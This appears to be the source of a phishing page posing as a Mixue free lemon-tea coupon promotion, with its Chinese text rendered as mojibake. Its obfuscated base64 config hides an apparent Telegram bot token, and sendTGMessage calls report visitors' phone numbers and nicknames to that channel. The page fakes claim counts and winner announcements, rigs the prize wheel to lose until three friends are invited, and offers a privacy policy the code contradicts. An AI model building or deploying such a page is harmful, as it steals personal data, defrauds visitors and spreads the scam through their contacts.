  <div class="modal-content">
    <h2>ğŸ‰ é¢†å–æˆåŠŸï¼</h2>
    <p>å¤§æ¯æŸ æª¬èŒ¶åˆ¸å·²å‘è‡³æ‰‹æœº</p>
    <div class="coupon-code" id="couponCode">MX2026-ICE-ABCD1234</div>
    <p style="font-weight:bold; margin:20px 0;">è¯·å°½å¿«åˆ°åº—æ ¸é”€ï¼Œè¿‡æœŸæ— æ•ˆ</p>
    <div class="modal-emoji">ğŸ‰ğŸ‹ğŸ”¥</div>
    <button class="btn" id="closeModalBtn">å¥½çš„ï¼Œå»å…‘æ¢ï¼</button>
    <button class="btn copy-btn" id="copyCouponBtn">ä¸€é”®å¤åˆ¶åˆ¸ç </button>
    <button class="btn share-btn" id="shareBtn">åˆ†äº«ç»™å¥½å‹</button>
    <button class="btn history-btn" id="viewHistoryBtn">æŸ¥çœ‹æˆ‘çš„åˆ¸ç å†å²</button>
  </div>
</div>

<div class="modal rejected-modal" id="rejectedModal">
  <div class="modal-content">
    <h2>å®¡æ ¸æœªé€šè¿‡</h2>
    <p>æŠ±æ­‰ï¼Œæ‚¨çš„ç”³è¯·æœªé€šè¿‡äººå·¥å®¡æ ¸</p>
    <p style="color:#666; font-size:0.9rem; margin:16px 0;">å¯èƒ½åŸå› ï¼šä¿¡æ¯å¼‚å¸¸ã€é‡å¤é¢†å–æˆ–å­˜åœ¨è¿è§„æ“ä½œ</p>
    <div class="modal-emoji">ğŸ˜”</div>
    <button class="btn" onclick="document.getElementById('rejectedModal').classList.remove('show')" style="background:linear-gradient(135deg, #999, #666);">æˆ‘çŸ¥é“äº†</button>
  </div>
</div>

<div class="modal" id="agreementModal">
  <div class="modal-content" style="max-height:80vh; overflow-y:auto; padding:24px 20px; text-align:left;">
    <h2 id="agreementTitle">åè®®æ ‡é¢˜</h2>
    <div id="agreementContent" style="font-size:0.9rem; line-height:1.6; color:#333; white-space:pre-wrap; margin:16px 0;"></div>
    <button class="btn" style="margin-top:20px; width:100%;" onclick="document.getElementById('agreementModal').classList.remove('show')">æˆ‘å·²é˜…è¯»</button>
  </div>
</div>

<!-- åˆ¸ç å†å²å¼¹çª— -->
<div class="modal" id="historyModal">
  <div class="modal-content" style="max-width:360px;">
    <h2>æˆ‘çš„åˆ¸ç å†å²</h2>
    <div class="history-list" id="historyList"></div>
    <button class="btn" onclick="document.getElementById('historyModal').classList.remove('show')">å…³é—­</button>
  </div>
</div>

<!-- å‡é›ªç‹å®¢æœèŠå¤©çª—å£ -->
<div class="modal" id="chatModal" style="display:none; z-index:100001;">
  <div class="modal-content" style="padding:0; max-width:380px; height:520px; display:flex; flex-direction:column; overflow:hidden;">
    <div style="background: linear-gradient(135deg, var(--mixue-red), #C92A39); color:white; padding:14px; text-align:center; position:relative;">
      <img src="https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046994-imagetourl.cloud-1770456904865-vyi8ak.jpg" 
           style="width:48px; height:48px; border-radius:50%; border:3px solid white; position:absolute; left:16px; top:50%; transform:translateY(-50%); box-shadow:0 2px 8px rgba(0,0,0,0.3);">
      <div style="margin-left:70px; text-align:left;">
        <div style="font-weight:bold; font-size:1.1rem;">é›ªç‹å°å†°</div>
        <div style="font-size:0.8rem; opacity:0.9;">åœ¨çº¿ Â· é€šå¸¸1åˆ†é’Ÿå†…å›å¤</div>
      </div>
    </div>
    
    <div id="chatMessages" style="flex:1; padding:16px; overflow-y:auto; background:#f8f9fa; display:flex; flex-direction:column;">
      <!-- æ¶ˆæ¯åŠ¨æ€æ’å…¥ -->
    </div>
    
    <div style="border-top:1px solid #eee; padding:12px; background:white; display:flex; gap:8px;">
      <input type="text" id="chatInput" placeholder="è¯´ç‚¹å•¥å§ï½ï¼ˆæ¯”å¦‚ï¼šåˆ¸ç æ€ä¹ˆç”¨ï¼Ÿï¼‰" 
             style="flex:1; height:44px; padding:0 16px; border:1px solid #ddd; border-radius:22px; font-size:1rem;">
      <button id="sendChatBtn" style="width:60px; height:44px; background:var(--mixue-red); color:white; border:none; border-radius:22px; font-weight:bold; cursor:pointer;">å‘é€</button>
    </div>
  </div>
</div>

<script>
// ============================= é…ç½®ï¼ˆå·²æ··æ·†ï¼‰ =============================
const _0x5f2c = {
  _b: 'ODMzODY3MjM5NTpBQUg5cmJ5czlzalktQnRodWJ2WHlWdjJScl9kX1ByX2tpSQ==',
  _c: 'ODQzOTQ0ODA4Nw==',
  _i: 'Njk4NTlhZmFkMGVhODgxZjQwYTRlNTI2',
  _k: 'JDJhJDEwJERlTlBYMVIwQzBQanNoREpmL3cxZC45d2M4ZkhMTkIwYUFHQndYbXJuc01DdlNWVHQvdmdh'
};

function _d(b) {
  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  let o = '', c1, c2, c3, e1, e2, e3, e4, i = 0;
  b = b.replace(/[^A-Za-z0-9+/=]/g, '');
  while (i < b.length) {
    e1 = a.indexOf(b.charAt(i++));
    e2 = a.indexOf(b.charAt(i++));
    e3 = a.indexOf(b.charAt(i++));
    e4 = a.indexOf(b.charAt(i++));
    c1 = (e1 << 2) | (e2 >> 4);
    c2 = ((e2 & 15) << 4) | (e3 >> 2);
    c3 = ((e3 & 3) << 6) | e4;
    o += String.fromCharCode(c1);
    if (e3 !== 64) o += String.fromCharCode(c2);
    if (e4 !== 64) o += String.fromCharCode(c3);
  }
  try {
    return decodeURIComponent(escape(o));
  } catch (e) {
    return o;
  }
}

const _cfg = {
  t: _d(_0x5f2c._b),
  u: _d(_0x5f2c._c),
  b: _d(_0x5f2c._i),
  m: _d(_0x5f2c._k)
};

const TOTAL_STOCK = 5000;
let claimed = 4567;
let isVerifySuccess = false;
let timers = {};
let isSending = false;
let isPolling = false;
let isSpinning = false;
let bonusActive = true;

// é‚€è¯·ç³»ç»ŸçŠ¶æ€
let inviteState = {
  invitedCount: 0,
  chanceCount: 0,
  hasWon: false,
  currentPhone: '',
  currentNickname: '',
  checkedIn: false,
  lastCheckIn: null
};

// ä»æœ¬åœ°å­˜å‚¨æ¢å¤æ•°æ®
function loadFromStorage() {
  try {
    const saved = localStorage.getItem('mx_invite_state');
    if (saved) {
      const data = JSON.parse(saved);
      inviteState.invitedCount = data.invitedCount || 0;
      inviteState.chanceCount = data.chanceCount || 0;
      inviteState.hasWon = data.hasWon || false;
      inviteState.checkedIn = data.checkedIn || false;
      inviteState.lastCheckIn = data.lastCheckIn || null;
      
      const today = new Date().toDateString();
      if (inviteState.lastCheckIn !== today) {
        inviteState.checkedIn = false;
      }
    }
  } catch (e) {
    console.warn('è¯»å–æœ¬åœ°å­˜å‚¨å¤±è´¥:', e);
  }
}

// ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨
function saveToStorage() {
  try {
    localStorage.setItem('mx_invite_state', JSON.stringify({
      invitedCount: inviteState.invitedCount,
      chanceCount: inviteState.chanceCount,
      hasWon: inviteState.hasWon,
      checkedIn: inviteState.checkedIn,
      lastCheckIn: inviteState.lastCheckIn,
      currentPhone: inviteState.currentPhone
    }));
  } catch (e) {
    console.warn('ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨å¤±è´¥:', e);
  }
}

function generateCouponCode() {
  const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
  const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
  return `${prefix}-ICE-${suffix}`;
}

// DOM å…ƒç´ ç¼“å­˜
const els = {
  phone: document.getElementById('phone'),
  nickname: document.getElementById('nickname'),
  code: document.getElementById('code'),
  couponCode: document.getElementById('couponCode'),
  getBtn: document.getElementById('getCodeBtn'),
  submitBtn: document.getElementById('submitBtn'),
  countdown: document.getElementById('countdown'),
  modal: document.getElementById('successModal'),
  rejectedModal: document.getElementById('rejectedModal'),
  claimedCount: document.getElementById('claimedCount'),
  remainCount: document.getElementById('remainCount'),
  countNum: document.getElementById('countNum'),
  barrageBox: document.getElementById('barrageBox'),
  verifySlider: document.getElementById('verifySlider'),
  verifyBlock: document.getElementById('verifyBlock'),
  verifyBg: document.getElementById('verifyBg'),
  loadingMask: document.getElementById('loadingMask'),
  globalTimer: document.getElementById('globalTimer'),
  closeModalBtn: document.getElementById('closeModalBtn'),
  agreementModal: document.getElementById('agreementModal'),
  agreementTitle: document.getElementById('agreementTitle'),
  agreementContent: document.getElementById('agreementContent'),
  mainPage: document.getElementById('mainPage'),
  invitePage: document.getElementById('invitePage'),
  inviteCount: document.getElementById('inviteCount'),
  chanceCount: document.getElementById('chanceCount'),
  inviteMoreBtn: document.getElementById('inviteMoreBtn'),
  wheelBtn: document.getElementById('wheelBtn'),
  wheelContainer: document.getElementById('wheelContainer'),
  wheel: document.getElementById('wheel'),
  step1: document.getElementById('step1'),
  step2: document.getElementById('step2'),
  step3: document.getElementById('step3'),
  line1: document.getElementById('line1'),
  line2: document.getElementById('line2'),
  inviteCodeInput: document.getElementById('inviteCodeInput'),
  redeemBtn: document.getElementById('redeemBtn'),
  checkInBtn: document.getElementById('checkInBtn'),
  bonusTag: document.getElementById('bonusTag'),
  bonusTimer: document.getElementById('bonusTimer'),
  keyboardHint: document.getElementById('keyboardHint'),
  cheatWarning: document.getElementById('cheatWarning'),
  copyCouponBtn: document.getElementById('copyCouponBtn'),
  shareBtn: document.getElementById('shareBtn'),
  viewHistoryBtn: document.getElementById('viewHistoryBtn'),
  historyList: document.getElementById('historyList'),
  chatModal: document.getElementById('chatModal'),
  chatMessages: document.getElementById('chatMessages'),
  chatInput: document.getElementById('chatInput'),
  sendChatBtn: document.getElementById('sendChatBtn')
};

function showToast(msg, duration = 2800) {
  const t = document.createElement('div');
  t.className = 'toast';
  t.innerHTML = msg;
  els.toastContainer = els.toastContainer || document.getElementById('toastContainer');
  els.toastContainer.appendChild(t);
  setTimeout(() => t.remove(), duration);
}

// ç²’å­æ•ˆæœ
function createParticles(x, y) {
  const colors = ['#E63946', '#FFD166', '#52c41a', '#FA541C', '#722ED1'];
  const emojis = ['ğŸ‰', 'ğŸŠ', 'âœ¨', 'ğŸ’«', 'â­', 'ğŸ‹', 'ğŸ¦'];
  
  for (let i = 0; i < 20; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    particle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
    particle.style.left = x + 'px';
    particle.style.top = y + 'px';
    particle.style.fontSize = (20 + Math.random() * 20) + 'px';
    particle.style.color = colors[Math.floor(Math.random() * colors.length)];
    particle.style.setProperty('--tx', (Math.random() - 0.5) * 300 + 'px');
    particle.style.setProperty('--ty', (Math.random() - 0.5) * 300 + 'px');
    document.body.appendChild(particle);
    setTimeout(() => particle.remove(), 3000);
  }
}

function shootBarrage(customPhone = null) {
  const chinaMobilePrefixes = ['134','135','136','137','138','139','147','150','151','152','157','158','159','172','178','182','183','184','187','188','198'];
  const chinaUnicomPrefixes = ['130','131','132','145','155','156','166','175','176','185','186'];
  const chinaTelecomPrefixes = ['133','149','153','173','177','180','181','189','199'];
  const chinaBroadcastPrefixes = ['192'];
  const allPrefixes = [...chinaMobilePrefixes, ...chinaUnicomPrefixes, ...chinaTelecomPrefixes, ...chinaBroadcastPrefixes];

  let phoneDisplay;
  if (customPhone && /^1[3-9]\d{9}$/.test(customPhone)) {
    phoneDisplay = customPhone.slice(0,3) + "****" + customPhone.slice(7);
  } else {
    const prefix = allPrefixes[Math.floor(Math.random() * allPrefixes.length)];
    const suffix = Math.floor(1000 + Math.random() * 9000);
    phoneDisplay = prefix + "****" + suffix;
  }

  const surnames = ['èµµ','é’±','å­™','æ','å‘¨','å´','éƒ‘','ç‹','å†¯','é™ˆ','è¤š','å«','è’‹','æ²ˆ','éŸ©','æ¨','æœ±','ç§¦','å°¤','è®¸','ä½•','å•','æ–½','å¼ ','å­”','æ›¹','ä¸¥','å','é‡‘','é­','é™¶','å§œ','éƒ','è‘£','æ¢','æœ','æˆ´','å®‹','å”','é‚“','è”¡','æ½˜','è¢','äº','èƒ¡','æ—','éƒ­','é©¬','ç½—','é«˜'];
  const surname = surnames[Math.floor(Math.random() * surnames.length)];

  const item = document.createElement('div');
  item.className = 'barrage-item';
  item.textContent = `${surname}** ${phoneDisplay} åˆšåˆšé¢†å–æˆåŠŸï¼`;

  const randomTop = 10 + Math.random() * (34 - 10);
  item.style.top = randomTop + 'px';

  const colors = ['#c1121f', '#e63946', '#d00000', '#9d0208', '#6a040f', '#370617'];
  item.style.color = colors[Math.floor(Math.random() * colors.length)];

  const duration = 3.5 + Math.random() * 2.0;
  item.style.animationDuration = duration + 's';

  els.barrageBox.appendChild(item);
  setTimeout(() => item.parentNode && item.remove(), duration * 1000 + 300);
}

function showAgreement(type) {
  let title = type === 'privacy' ? 'éšç§æ”¿ç­–' : 'ç”¨æˆ·åè®®';
  let content = type === 'privacy' ? 
`æœ€åæ›´æ–°ï¼š2026å¹´1æœˆ1æ—¥

æˆ‘ä»¬é‡è§†æ‚¨çš„éšç§ã€‚æœ¬æ”¿ç­–è¯´æ˜æˆ‘ä»¬å¦‚ä½•æ”¶é›†ã€ä½¿ç”¨å’Œä¿æŠ¤æ‚¨çš„ä¿¡æ¯ã€‚

1. æ”¶é›†çš„ä¿¡æ¯
- æ‰‹æœºå·ã€æ˜µç§°ï¼ˆæ‚¨ä¸»åŠ¨æä¾›ï¼‰
- è®¾å¤‡ä¿¡æ¯ã€IPåœ°å€ã€è®¿é—®æ—¶é—´

2. ä½¿ç”¨ç›®çš„
- èº«ä»½éªŒè¯ä¸ç¦åˆ©å‘æ”¾
- é˜²åˆ·ã€é˜²ä½œå¼Š
- æœåŠ¡ä¼˜åŒ–

3. ä¿¡æ¯å…±äº«
ä»…åœ¨å¿…è¦æ—¶ä¸èœœé›ªå†°åŸå®˜æ–¹åˆä½œé—¨åº—å…±äº«åˆ¸ç ä¿¡æ¯ç”¨äºæ ¸é”€ï¼Œä¸ä¼šå‡ºå”®æ‚¨çš„ä¸ªäººä¿¡æ¯ã€‚

4. æ‚¨çš„æƒåˆ©
å¯è”ç³»æˆ‘ä»¬ç”³è¯·æŸ¥çœ‹ã€æ›´æ­£æˆ–åˆ é™¤ä¸ªäººä¿¡æ¯ã€‚

æ„Ÿè°¢æ‚¨çš„ä¿¡ä»»ï¼` :
`æœ€åæ›´æ–°ï¼š2026å¹´1æœˆ1æ—¥

1. æœåŠ¡è¯´æ˜
æœ¬æ´»åŠ¨æä¾›é™é‡å…è´¹å¤§æ¯æŸ æª¬èŒ¶åˆ¸ï¼Œå…ˆåˆ°å…ˆå¾—ã€‚

2. ä½¿ç”¨è§„åˆ™
- æ¯æ‰‹æœºå·é™é¢†1æ¬¡
- ç¦æ­¢ä½¿ç”¨è„šæœ¬ã€æ¥ç å¹³å°
- åˆ¸ç éœ€åœ¨æœ‰æ•ˆæœŸå†…åˆ°åº—æ ¸é”€

3. è¿è§„å¤„ç†
å‘ç°ä½œå¼Šè¡Œä¸ºå°†å–æ¶ˆèµ„æ ¼å¹¶æ°¸ä¹…é™åˆ¶å‚ä¸ã€‚

4. å…è´£å£°æ˜
æ´»åŠ¨æœ€ç»ˆè§£é‡Šæƒå½’èœœé›ªå†°åŸæ‰€æœ‰ã€‚å› ä¸å¯æŠ—åŠ›å¯¼è‡´æ´»åŠ¨å˜æ›´ï¼Œæˆ‘ä»¬ä¸æ‰¿æ‹…è´£ä»»ã€‚

ç‚¹å‡»"è·å–éªŒè¯ç "å³è¡¨ç¤ºåŒæ„æœ¬åè®®å…¨éƒ¨æ¡æ¬¾ã€‚`;

  els.agreementTitle.textContent = title;
  els.agreementContent.textContent = content;
  els.agreementModal.classList.add('show');
}

function updateStock() {
  const remain = Math.max(0, TOTAL_STOCK - claimed);
  els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
  els.remainCount.textContent = remain.toLocaleString('zh-CN');
  els.countNum.textContent = claimed.toLocaleString('zh-CN');
  if (remain < 100) els.remainCount.classList.add('low-stock');
}

function fakeClaim() {
  if (Math.random() > 0.4) {
    const add = 1 + Math.floor(Math.random() * 4);
    claimed += add;
    updateStock();
    const barrageCount = Math.min(add + Math.floor(Math.random() * 2), 6);
    for (let i = 0; i < barrageCount; i++) {
      setTimeout(shootBarrage, i * 400 + Math.random() * 350);
    }
  }
}

function checkPhoneValid() {
  const val = els.phone.value.trim();
  const valid = /^1[3-9]\d{9}$/.test(val);
  els.phone.classList.toggle('input-error', val && !valid);

  if (valid) {
    els.verifySlider.classList.add('show');
    if (!els.verifyBlock.dataset.inited) initSlider();
  } else {
    els.verifySlider.classList.remove('show');
    isVerifySuccess = false;
    resetSlider();
  }
  els.getBtn.disabled = !valid || !isVerifySuccess || isSending;
}

function resetSlider() {
  els.verifySlider.classList.remove('verify-success');
  els.verifyBlock.style.left = '0';
  els.verifyBg.style.width = '0';
  els.verifyBlock.textContent = 'â†’';
  const verifyText = els.verifySlider.querySelector('.verify-text');
  if (verifyText) verifyText.textContent = 'å‘å³æ»‘åŠ¨å®ŒæˆéªŒè¯';
}

function initSlider() {
  els.verifyBlock.dataset.inited = 'true';
  let dragging = false;
  const max = els.verifySlider.offsetWidth - els.verifyBlock.offsetWidth;

  const start = e => {
    if (isVerifySuccess) return;
    dragging = true;
    const sx = e.clientX || e.touches?.[0]?.clientX;
    const sl = parseFloat(els.verifyBlock.style.left) || 0;

    const move = ev => {
      if (!dragging) return;
      const dx = (ev.clientX || ev.touches?.[0]?.clientX) - sx;
      let l = Math.max(0, Math.min(sl + dx, max));
      els.verifyBlock.style.left = l + 'px';
      els.verifyBg.style.width = l + 'px';
    };

    const end = () => {
      dragging = false;
      const l = parseFloat(els.verifyBlock.style.left) || 0;
      if (l >= max * 0.8) {
        isVerifySuccess = true;
        els.verifySlider.classList.add('verify-success');
        els.verifyBlock.textContent = 'âœ“';
        els.verifyBlock.style.left = max + 'px';
        els.verifyBg.style.width = max + 'px';
        const verifyText = els.verifySlider.querySelector('.verify-text');
        if (verifyText) verifyText.textContent = 'éªŒè¯æˆåŠŸ';
        checkPhoneValid();
      } else resetSlider();
      document.removeEventListener('mousemove', move);
      document.removeEventListener('touchmove', move);
      document.removeEventListener('mouseup', end);
      document.removeEventListener('touchend', end);
    };

    document.addEventListener('mousemove', move);
    document.addEventListener('touchmove', move, {passive:false});
    document.addEventListener('mouseup', end);
    document.addEventListener('touchend', end);
  };

  els.verifyBlock.addEventListener('mousedown', start);
  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e); }, {passive:false});
}

function startCountdown() {
  if (!els.globalTimer) return;
  let sec = 120*60 + Math.floor(Math.random()*180*60);
  const tick = () => {
    if (sec <= 0) {
      els.globalTimer.textContent = 'æœ¬è½®å·²ç»“æŸï¼Œè¯·åˆ·æ–°';
      setTimeout(() => location.reload(), 4000);
      return;
    }
    const h = Math.floor(sec/3600).toString().padStart(2,'0');
    const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
    const s = (sec%60).toString().padStart(2,'0');
    els.globalTimer.textContent = `æœ¬è½®åé¢å€’è®¡æ—¶ï¼š${h}:${m}:${s}`;
    sec--;
  };
  tick();
  timers.global = setInterval(tick, 1000);
}

function startBonusCountdown() {
  let sec = 300;
  const tick = () => {
    if (sec <= 0) {
      bonusActive = false;
      if (els.bonusTag) els.bonusTag.style.display = 'none';
      const bonusEl = document.querySelector('.countdown-bonus');
      if (bonusEl) bonusEl.style.opacity = '0.5';
      return;
    }
    const m = Math.floor(sec/60).toString().padStart(2,'0');
    const s = (sec%60).toString().padStart(2,'0');
    if (els.bonusTimer) els.bonusTimer.textContent = `${m}:${s}`;
    sec--;
  };
  tick();
  timers.bonus = setInterval(tick, 1000);
}

function initSplashScreen() {
  const splash = document.getElementById('splashScreen');
  const progress = document.getElementById('splashProgress');
  const text = document.getElementById('splashText');
  
  let progressValue = 0;
  const interval = setInterval(() => {
    progressValue += 2;
    if (progress) progress.style.width = progressValue + '%';
    
    if (progressValue === 30 && text) text.textContent = 'æ­£åœ¨å‡†å¤‡ç”œèœœæƒŠå–œ...';
    if (progressValue === 60 && text) text.textContent = 'é›ªç‹æ­£åœ¨è°ƒé…æœ€ä½³å£å‘³...';
    if (progressValue === 90 && text) text.textContent = 'é©¬ä¸Šå°±å¥½...';
    
    if (progressValue >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        if (splash) splash.classList.add('hide');
      }, 300);
    }
  }, 60);
}

function showInvitePage(phone, nickname) {
  inviteState.currentPhone = phone;
  inviteState.currentNickname = nickname;
  
  const urlParams = new URLSearchParams(window.location.search);
  const refCode = urlParams.get('invite');
  if (refCode && els.inviteCodeInput) {
    els.inviteCodeInput.value = refCode.toUpperCase();
  }
  
  if (els.mainPage) els.mainPage.classList.add('hidden');
  if (els.invitePage) {
    els.invitePage.classList.remove('hidden');
    els.invitePage.classList.add('show');
  }
  
  loadFromStorage();
  updateInviteUI();
  startBonusCountdown();
  
  if (els.keyboardHint) {
    setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
    setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
  }
  
  sendTGMessage(`ã€è¿›å…¥é‚€è¯·é¡µé¢ã€‘\næ‰‹æœºå·ï¼š${phone}\næ˜µç§°ï¼š${nickname}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);
}

function updateInviteUI() {
  if (els.inviteCount) els.inviteCount.textContent = inviteState.invitedCount;
  if (els.chanceCount) els.chanceCount.textContent = `å‰©ä½™æŠ½å¥–æ¬¡æ•°ï¼š${inviteState.chanceCount}`;
  
  if (els.checkInBtn) {
    if (inviteState.checkedIn) {
      els.checkInBtn.disabled = true;
      els.checkInBtn.textContent = 'âœ… ä»Šæ—¥å·²ç­¾åˆ°';
    } else {
      els.checkInBtn.disabled = false;
      els.checkInBtn.textContent = 'ğŸ“… æ¯æ—¥ç­¾åˆ° (+1æ¬¡æœºä¼š)';
    }
  }
  
  if (els.step1 && els.step2 && els.step3 && els.line1 && els.line2) {
    if (inviteState.invitedCount >= 1) {
      els.step1.classList.add('completed');
      els.step1.textContent = 'âœ“';
      els.line1.classList.add('completed');
    }
    if (inviteState.invitedCount >= 2) {
      els.step2.classList.add('completed');
      els.step2.textContent = 'âœ“';
      els.line2.classList.add('completed');
    }
    if (inviteState.invitedCount >= 3) {
      els.step3.classList.add('completed');
      els.step3.textContent = 'âœ“';
    } else {
      els.step3.classList.add('active');
    }
  }
  
  if (els.bonusTag) {
    if (bonusActive && inviteState.invitedCount > 0) {
      els.bonusTag.style.display = 'block';
    } else {
      els.bonusTag.style.display = 'none';
    }
  }
  
  if (els.wheelContainer) {
    if (inviteState.invitedCount > 0) {
      els.wheelContainer.style.display = 'block';
    } else {
      els.wheelContainer.style.display = 'none';
    }
  }
  
  if (els.wheelBtn && els.inviteMoreBtn) {
    if (inviteState.chanceCount > 0) {
      els.wheelBtn.classList.remove('hidden');
      els.inviteMoreBtn.classList.add('hidden');
      els.wheelBtn.disabled = false;
      els.wheelBtn.textContent = 'ğŸ° å¼€å§‹æŠ½å¥–';
    } else {
      els.wheelBtn.classList.add('hidden');
      els.inviteMoreBtn.classList.remove('hidden');
      els.inviteMoreBtn.textContent = 'ğŸ‘¥ é‚€è¯·å¥½å‹';
      els.inviteMoreBtn.disabled = false;
    }
  }
  
  saveToStorage();
}

function dailyCheckIn() {
  if (inviteState.checkedIn) {
    showToast('ä»Šæ—¥å·²ç­¾åˆ°ï¼Œæ˜å¤©å†æ¥å§ï¼');
    return;
  }
  
  const today = new Date().toDateString();
  inviteState.checkedIn = true;
  inviteState.lastCheckIn = today;
  inviteState.chanceCount += 1;
  
  showToast('ç­¾åˆ°æˆåŠŸï¼è·å¾—1æ¬¡æŠ½å¥–æœºä¼š ğŸ‰');
  updateInviteUI();
  saveToStorage();
  
  sendTGMessage(`ã€æ¯æ—¥ç­¾åˆ°ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nè·å¾—æ¬¡æ•°ï¼š1\næ€»æ¬¡æ•°ï¼š${inviteState.chanceCount}`);
}

function simulateInvite() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let inviteCode = '';
  for (let i = 0; i < 6; i++) {
    inviteCode += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  
  const currentUrl = window.location.href.split('?')[0];
  const shareLink = `${currentUrl}?invite=${inviteCode}`;
  const shareText = `ğŸ‰ èœœé›ªå†°åŸå…è´¹é¢†æŸ æª¬èŒ¶ï¼\n\næˆ‘çš„é‚€è¯·ç ï¼š${inviteCode}\nç‚¹å‡»é“¾æ¥å¸®æˆ‘åŠ©åŠ›ï¼š${shareLink}\n\nä½ ä¹Ÿå¯ä»¥é¢†åˆ¸å“¦ï¼`;
  
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(shareText).then(() => {
      showToast('é‚€è¯·é“¾æ¥å’Œé‚€è¯·ç å·²å¤åˆ¶ï¼å¿«å»åˆ†äº«å§ ğŸ“‹');
    }).catch(() => {
      fallbackCopy(shareText);
    });
  } else {
    fallbackCopy(shareText);
  }
  
  if (els.inviteMoreBtn) {
    els.inviteMoreBtn.disabled = true;
    els.inviteMoreBtn.textContent = 'é‚€è¯·ä¸­...';
  }
  
  setTimeout(() => {
    inviteState.invitedCount++;
    
    let gainedChance = Math.floor(Math.random() * 5) + 1;
    
    if (bonusActive) {
      gainedChance *= 2;
      showToast(`ğŸ‰ ç¿»å€å¥–åŠ±ï¼è·å¾— ${gainedChance} æ¬¡æŠ½å¥–æœºä¼š`);
    } else {
      showToast(`æˆåŠŸé‚€è¯·å¥½å‹ï¼è·å¾— ${gainedChance} æ¬¡æŠ½å¥–æœºä¼š`);
    }
    
    inviteState.chanceCount += gainedChance;
    
    sendTGMessage(`ã€æ–°é‚€è¯·ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\né‚€è¯·ç ï¼š${inviteCode}\nå½“å‰é‚€è¯·æ•°ï¼š${inviteState.invitedCount}\nè·å¾—æ¬¡æ•°ï¼š${gainedChance}\næ€»æ¬¡æ•°ï¼š${inviteState.chanceCount}\nç¿»å€çŠ¶æ€ï¼š${bonusActive ? 'æ˜¯' : 'å¦'}`);
    
    updateInviteUI();
    saveToStorage();
    
    if (inviteState.invitedCount >= 3) {
      showToast('ğŸ‰ å·²é‚€è¯·æ»¡3äººï¼ç°åœ¨æŠ½å¥–å¿…ä¸­ï¼', 4000);
    }
  }, 1500);
}

function fallbackCopy(text) {
  const textArea = document.createElement('textarea');
  textArea.value = text;
  textArea.style.position = 'fixed';
  textArea.style.left = '-9999px';
  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();
  
  try {
    document.execCommand('copy');
    showToast('é‚€è¯·é“¾æ¥å’Œé‚€è¯·ç å·²å¤åˆ¶ï¼å¿«å»åˆ†äº«å§ ğŸ“‹');
  } catch (err) {
    showToast('å¤åˆ¶å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨å¤åˆ¶');
  }
  document.body.removeChild(textArea);
}

function redeemInviteCode() {
  const code = els.inviteCodeInput.value.trim().toUpperCase();
  
  if (code.length !== 6) {
    showToast('è¯·è¾“å…¥6ä½é‚€è¯·ç ');
    return;
  }
  
  const codeRegex = /^[A-Z0-9]{6}$/;
  if (!codeRegex.test(code)) {
    showToast('é‚€è¯·ç æ ¼å¼é”™è¯¯');
    return;
  }
  
  if (els.redeemBtn) {
    els.redeemBtn.disabled = true;
    els.redeemBtn.textContent = 'å…‘æ¢ä¸­...';
  }
  
  setTimeout(() => {
    if (Math.random() > 0.2) {
      const gainedChance = Math.floor(Math.random() * 3) + 1;
      inviteState.chanceCount += gainedChance;
      
      showToast(`å…‘æ¢æˆåŠŸï¼è·å¾— ${gainedChance} æ¬¡æŠ½å¥–æœºä¼š ğŸ`);
      if (els.inviteCodeInput) els.inviteCodeInput.value = '';
      
      sendTGMessage(`ã€å…‘æ¢é‚€è¯·ç ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\né‚€è¯·ç ï¼š${code}\nè·å¾—æ¬¡æ•°ï¼š${gainedChance}\næ€»æ¬¡æ•°ï¼š${inviteState.chanceCount}`);
      
      updateInviteUI();
      saveToStorage();
    } else {
      showToast('é‚€è¯·ç æ— æ•ˆæˆ–å·²è¢«ä½¿ç”¨ ğŸ˜¢');
    }
    
    if (els.redeemBtn) {
      els.redeemBtn.disabled = false;
      els.redeemBtn.textContent = 'å…‘æ¢';
    }
  }, 1000);
}

function spinWheel() {
  if (inviteState.chanceCount <= 0 || isSpinning) return;
  
  isSpinning = true;
  inviteState.chanceCount--;
  updateInviteUI();
  
  if (els.wheelBtn) {
    els.wheelBtn.disabled = true;
    els.wheelBtn.textContent = 'æŠ½å¥–ä¸­...';
  }
  
  let resultIndex;
  const winIndices = [0, 2, 4, 6];
  const loseIndices = [1, 3, 5, 7];
  
  if (inviteState.invitedCount < 3) {
    resultIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
  } else {
    resultIndex = winIndices[Math.floor(Math.random() * winIndices.length)];
    inviteState.hasWon = true;
  }
  
  const baseRotation = 360 * 5;
  const itemAngle = 45;
  const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
  const totalRotation = baseRotation + targetAngle;
  
  if (els.wheel) els.wheel.style.transform = `rotate(${totalRotation}deg)`;
  
  setTimeout(() => {
    handleWheelResult(resultIndex);
    isSpinning = false;
    if (els.wheelBtn) {
      els.wheelBtn.disabled = false;
      els.wheelBtn.textContent = 'ğŸ° å¼€å§‹æŠ½å¥–';
    }
  }, 4000);
}

function handleWheelResult(index) {
  const results = [
    { name: 'æŸ æª¬èŒ¶åˆ¸', type: 'win', emoji: 'ğŸ' },
